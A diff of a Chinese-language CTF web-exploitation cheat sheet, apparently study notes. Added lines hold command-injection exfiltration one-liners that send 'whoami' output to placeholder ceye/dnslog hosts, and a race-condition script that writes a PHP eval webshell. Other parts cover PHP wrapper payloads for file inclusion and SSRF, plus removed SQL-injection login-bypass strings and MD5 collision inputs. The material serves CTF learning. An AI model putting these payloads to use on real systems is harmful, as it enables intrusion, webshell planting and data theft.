+ping -c 1 `whoami`.xxxx.ceye.io
+
+# windows
+http:
+for /F %x in ('whoami') do start http://xxx.ceye.io/%x
+dns请求：
+获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info
+获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info
+
+for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);
+```
+
+**长度限制**
+
++ 文件构造（参考橘子那个 hitcon）
+
+```shell
+>w
+将会创建一个名字为 w 的空文件。
+```
+
+工具
+
+- [shelling](https://github.com/ewilded/shelling)
+
+
+
+## 文件相关
 
 ### 上传
 
 ### 包含
 
-l   .user.ini 搭配 图片或其他
+.user.ini 搭配 图片或其他
 
-l   .htaccess
+.htaccess
 
-l   php://filter/read=convert.base64-encode/resource=files/images/xxx/resource=files/xxx
+php://filter/read=convert.base64-encode/resource=files/images/xxx/resource=files/xxx
 
-l   php3 php5 phtml 
+  php3 php5 phtml 
 
 l   zip协议,phar协议
 
@@ -1591,166 +2082,195 @@ location ~ \.php$ {
 
 ## PHP 特性
 
-**类型：**
+### 杂项
 
-+   弱类型
-+   intval
-+   strpos 和 ===
-+   反序列化 + destruct
-+   \0 截断
-+   iconv 截断
-+   parse_str()
-+   伪协议
-
-在线调试环境：http://www.shucunwang.com/RunCode/php
-
-**思路：**
-
-+   判断是否存在 PHP 中截断特性
-
-+   查看源码，判断是否存在 PHP 弱类型问题
-
-+   查看源码，注意一些特殊函数，eval(), system(), intval()
-
-+   构造变量，获取flag
-
-+   是否存在 HPP
-
-+   魔法哈希 0e开头，sha1(), md5()无法处理数组
-
-    如果要找出 `0e` 开头的 hash 碰撞，可以用如下代码
-
-    ```php
-    <?php
-     
-    $salt = 'vunp';
-    $hash = '0e612198634316944013585621061115';
-     
-    for ($i=1; $i<100000000000; $i++) {
-        if (md5($salt . $i) == $hash) {
-            echo $i;
-            break;
-        }
-    }
-     
-    echo 'done';
-    ```
-
-    常见的payload:
-
-    ==md5==
-
-    QNKCDZO
-0e830400451993494058024219903391
-    s155964671a
-0e342768416822451524974117254469
-    s214587387a
-0e848240448830537924465865611904
-    s878926199a
-0e545993274517709034328855841020
-    s1091221200a
-0e940624217856561557816327384675
-    s1885207154a
-0e509367213418206700842008763514
-    s1836677006a
-0e481036490867661113260034900752
-    s1184209335a
-0e072485820392773389523109082030
-    s1665632922a
-0e73119806149116307319712
-    s1502113478a
-0e861580163291561247404381396064
-    s532378020a
-0e220463095855511507588041205815
-    
-
-==sha1==	
-    10932435112: 0e07766915004133176347055865026311692244
-aaroZmOk: 0e66507019969427134894567494305185566735
-aaK1STfY: 0e76658526655756207688271159624026011393
-aaO8zKZF: 0e89257456677279068558073954252716165668
-    aa3OFF9m: 0e36977786278517984959260394024281014729
-
-    ==crc32==
-    
-    6586: 0e817678
-    
-    两个 md5 一样的字符串
-    
-    ```python
-from binascii import unhexlify
-    from hashlib import md5
-from future.moves.urllib.parse import quote
-    
-input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
-    'd8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')
-
-    print(quote(input1))
-    print md5(input1).hexdigest()
-    
-    input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')
-    print md5(input2).hexdigest()
-    print(quote(input2))
 ```
-    
-另外一组 md5 一样的字符串
-    
-​```python
-    from array import array
-from hashlib import md5
-    input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])
-    input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1<<10, 0, 0, 0, 0, 1<<31, 0, 0, 0, 0, 0])])
-    print(input1 == input2) # False
-    print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
-    print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
+// 返回环境变量、服务器变量和用户定义的变量。
+get_defined_vars()
+
+// 返回一个包含用户自定义函数、php 内建函数的数组
+get_defined_functions()
+
+// 返回模块函数名称的数组
+get_loaded_extensions()
+
+// 返回模块函数名称的数组
+get_extension_funcs()
+
+//返回所有常量的关联数组
+get_defined_constants()
+
+// 返回由已定义类的名字所组成的数组
+get_declared_classes()
 ```
 
-**伪协议**
-
-+ php://filter – 对本地磁盘文件进行读写
-
-  查看源码：file=php://filter/read=convert.base64-encode/resource=index.php
-
-+ php://input 伪协议需要服务器支持，同时要求 allow_url_include = on
-
-  fn=php://input，然后再 post 一个 fn=xx
-
-+ php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区
-
-+ php://memory 总是把数据存储在内存中
-
-+ php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中
-
-+ data://
-
-DATA伪协议，分号和逗号有争议
-
-+   data:,文本数据
-+   data:text/plain ,文本数据
-+   data:text/html,HTML代码
-+   data:text/css;base64,css代码
-+   data:text/javascript;base64,javascript代码
-+   data:image/x-icon;base64,base64编码的 icon 图片数据
-+   data:image/gif;base64,base64编码的gif图片数据
-+   data:image/png;base64,base64编码的png图片数据
-+   data:image/jpeg;base64,base64编码的png图片数据
-
-zip://
-
-把1.php文件压缩成.zip，再把后缀改成png，上传上去
+**上传后删除问题**
 
 ```php
-?file=zip://1.png%231.php
-// ?file=zip://1.zip%231.php
+$user = $_POST['user'];
+$filename = __DIR__.'\\'.$user['name'];
+$data = $user['info'];
+
+file_put_contents($filename, $data);
+
+print_r($_POST);
+// 一些处理
+if (file_exists($filename)) {
+	unlink($filename);
+}
+```
+
+现在我们能控制$user变量，也就是说可以写入任意文件，但之后立刻就会被删除。
+
+这种情况多存在于一些有缓存文件、临时文件的逻辑中，在实战里经常遇到。
+
+利用条件竞争，在删除前生成新的shell。也可以开两个 intruder。
+
+```python
+import os, requests, threading
+
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.url = "http://127.0.0.1/tt.php"
+        self.uploadUrl = "http://127.0.0.1/index.php"
+
+    def _get(self):
+        print('try to call uploaded file...')
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print("[*]create file info.php success")
+            os._exit(0)
+
+    def _upload(self):
+        print("upload file.....")
+        # file = {"file": '''<?php file_put_contents("x.php", '<?php eval($_POST[1]);?>');?>'''}
+        data = {
+            'user[name]' : 'tt.php',
+            'user[info]' : '''<?php file_put_contents("x.php", '<?php eval($_POST[1]);?>');?>''',
+        }
+        requests.post(self.uploadUrl, data=data)
+
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == "__main__":
+    threads = 20
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+        
+    for i in range(threads):
+        t.join()
 ```
 
 
 
->   glob:// 查找匹配的文件路径模式
+除此之外，这个题的关键就看 file_put_contents 和后面的 unlink、file_exists 有什么区别。
+
+查看源码能发现，php读取、写入文件，都会调用 php_stream_open_wrapper_ex 来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。
+再跟一跟 php_stream_open_wrapper_ex 会发现，php 最后会使用 tsrm_realpath() 将 filename 标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。
+
+![](<https://images.zsxq.com/FgrtzZGHdtl2tOVHcTcPfQjoifqk?e=1906272000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nOCUP5n_a3yeCy9N0nUXKpX_g2U=>)
+
+所以，如果传入的是一个不存在的路径，写入前会处理掉“../”等相对路径，所以不会出错；
+判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。
+
+```
+linux
+xxxxx/../t.php
+t.php/. 
+
+windows
+test.php:test test.ph< 来绕过文件删除
+user[name]=2.php:test&user[info]=2y 会生成 2.php
+user[name]=2.ph<&user[info]=2y 会写入内容
+```
 
 
 
-**文件操作相关**
+### 伪协议
+
+> 之前学习`phar`协议反序列化时fuzz过一遍PHP函数，发现了PHP的一个特点：**只要是传filename的地方，基本都可以传协议流**。而`file_put_contents`的第一个参数显然就是传`filename`的地方，那么试试可不可以利用php伪协议？
+
+```
+php://filter – 对本地磁盘文件进行读写
+file=php://filter/convert.base64-encode/resource=flag.php
+file=php://filter/read=convert.base64-encode/resource=index.php
+file=php://filter/write=convert.base64-decode/resource=index.php
+
+
+phar:// '/'
+发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。
+写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。
+最后使用phar进行包含 这里的路径为上传的 jpg 文件在服务器的路径
+
+/index.php?id=phar://路径/xxx.jpg/shell
+
+zip:// '#' 与 phar 类似
+把1.php文件压缩成 1.zip，再把后缀改成 png，上传上去
+?file=zip://1.png%231.php
+// ?file=zip://1.zip%231.php
+
+php://input 伪协议需要服务器支持，同时要求 allow_url_include = on（有这条件直接远程文件包含）
+可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。
+但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。
+<?php
+$user = $_GET["user"];
+$file = $_GET["file"];
+if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+?>
+此时 user=php://input，然后 post 一下 the user is admin
+
+
+dict://
+# 查看 redis 中的 info 数据
+/index.php?url=dict://127.0.0.1:6379/info
+# 查看 ssh 的 banner
+/index.php?url=dict://127.0.0.1:ssh端口/info
+
+
+data:// 分号和逗号有争议
+data:,文本数据
+data:text/plain, 文本数据
+data:text/html, HTML代码
+data:text/css;base64, css代码
+data:text/javascript;base64, javascript代码
+data:image/x-icon;base64, base64编码的 icon 图片数据
+data:image/gif;base64, base64编码的gif图片数据
+
+
+zlib:// bzip2:// zlib://
+3个封装协议，都是直接打开压缩文件。
+compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
+compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
+zip://archive.zip#dir/file.txt - 处理的是 '.zip' 后缀的压缩包里的文件
+zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。
+
+
+php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区
+
+php://memory 总是把数据存储在内存中
+
+php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中
+
+glob:// 查找匹配的文件路径模式
+```
+
+
+
+### 文件操作相关
 
 ```php
 // 列出目录
@@ -1761,22 +2281,23 @@ show_source('flag.php');
 highlight_file('flag.php');
 var_dump(file('flag.php'));  // 以下两个以数组形式输出
 print_r(file('flag.php'));
+readfile('flag.php')  // 直接显示
 
 // 读取文件内容
 file_get_contents('flag.php');
 file_get_contents('http://www.baidu.com')  // 读取远程内容，可用作爬虫
     
 获取当前文件所在目录:
-1.print_r(getcwd()); 
-2.print_r(dirname(__FILE__));
+print_r(getcwd()); 
+print_r(dirname(__FILE__));
 
 获取当前文件目录(包含本身文件名):
 print_r(__FILE__);
 
 遍历当前目录的文件:
-1.print_r(scandir(getcwd())); 
-2.print_r(scandir(dirname(__FILE__))); 
-3.print_r(glob("*"))
+print_r(scandir(getcwd())); 
+print_r(scandir(dirname(__FILE__))); 
+print_r(glob("*"))
 
 遍历当前目录的前目录的文件:
 print_r(scandir(dirname(__FILE__) . "/../"));
@@ -1787,120 +2308,18 @@ print_r(scandir(dirname(__FILE__) . "/../"));
 ```
 
 
+## Python 特性
+
+## Java 特性
 
 
-
-## 后台登录类
-
-**类型：**
-
-+   各种万能密码绕过
-+   变形的万能密码绕过
-+   社工的方式得到后台密码
-+   爆破的方式得到后台密码
-+   各种 cms 后台登陆绕过
-
-```shell
-# asp万能密码
-'or'='or'
-
-# aspx万能密码
-1： "or "a"="a
-2： ')or('a'='a
-3：or 1=1--
-4：'or 1=1--
-5：a'or' 1=1--
-6： "or 1=1--
-7：'or'a'='a
-8： "or"="a'='a
-9：'or''='
-10：'or'='or'
-11: 1 or '1'='1'=1
-12: 1 or '1'='1' or 1=1
-13: 'OR 1=1%00
-14: "or 1=1%00
-15: 'xor
-16: 新型万能登陆密码
-username: ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
-passwd: 1
-Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
-Password=1
-17..admin' or 'a'='a 密码随便
-
-# PHP万能密码
-'or'='or'
-'or 1=1/*  字符型 GPC是否开都可以使用
-User: something
-Pass: ' OR '1'='1
-
-# jsp 万能密码
-1'or'1'='1
-admin' OR 1=1/*
-用户名：admin （系统存在此用户)
-密码：1'or'1'='1
-```
+## 防御
 
 
-
-**思路：**
-
-+   根据提示，判断是否是普通的登陆绕过，或是利用社工的方式
-+   普通登陆绕过尝试各种万能密码绕过，或通过普通的 sql 注入漏洞得到账号密码，或 xss 盲打，sqlmap注入
-+   如果是 cms 系统登陆，查看是否有相应版本的后台绕过漏洞
-+   如果是社工方式，谷歌，百度，社工库
-+   爆破获取
-+   robots.txt 找找后台
-
-## 加解密
-
-**类型：**
-
-+   简单的编码(多次 base64 编码)
-+   密码题(hash 长度扩展、异或、移位加密各种变形)
-+   js 加解密
-+   根据加密源码写解密脚本
-
-**思路：**
-
-+   判断是编码还是加密
-+   如果是编码，判断编码类型，尝试解码或多次解码
-+   如果是加密，判断是现有的加密算法，还是自写的加密算法
-+   是否是对称加密，是否存在秘钥泄露等，获取秘钥解密
-+   根据加密算法，推断出解密算法
 
 ## 流量分析
 
-## 命令执行
 
-#### 直接执行代码
-
-PHP 中有不少可以直接执行代码的函数。
-
-```php
-eval();
-assert();
-system();
-exec();
-shell_exec();
-passthru();
-escapeshellcmd();
-pcntl_exec();
-```
-
-#### preg_replace( ) 代码执行
-
-preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。
-
-```php
-<?php
-    $var = "<tag>phpinfo()</tag>";
-	preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
-?>
-```
-
-若无 `/e` 修饰符，则可以尝试 %00 截断。
-
-[继续学习](https://ctf-wiki.github.io/ctf-wiki/web/php/php/)
 
 ## 其他
 
